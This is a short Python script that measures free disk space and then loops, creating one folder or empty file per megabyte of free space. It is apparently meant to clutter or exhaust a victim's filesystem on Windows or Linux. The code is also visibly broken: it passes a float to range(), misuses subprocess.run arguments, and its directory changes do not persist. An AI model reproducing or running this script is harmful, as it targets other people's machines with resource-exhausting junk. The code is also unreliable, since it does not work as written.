import platform #for getting Os for commands of creating folder 
import shutil #used for getting hardrive freespace 
import subprocess #sending commands to terminal 


OS = platform.system() #gets the operating system 


def get_free_space(path='/'):
    #gets free space in bytes for the given path 
    total,used,free = shutil.disk_usage(path)
    mb = free / (1024 **2)
    return mb




free = get_free_space()


if OS == "Windows" or OS == "windows":
    subprocess.run("cd /", shell=True)
    foldernumber = 0
    for i in range(free):
        subprocess.run("mkdir", f"NewFolder{foldernumber}", shell=True)
        foldernumber += 1

elif OS == "Linux" or OS == "linux":
    subprocess.run("cd /", shell=True)
    foldernumber = 0
    for i in range(free):
        subprocess.run("touch", f"NewFolder{foldernumber}.txt", shell= False)
        foldernumber += 1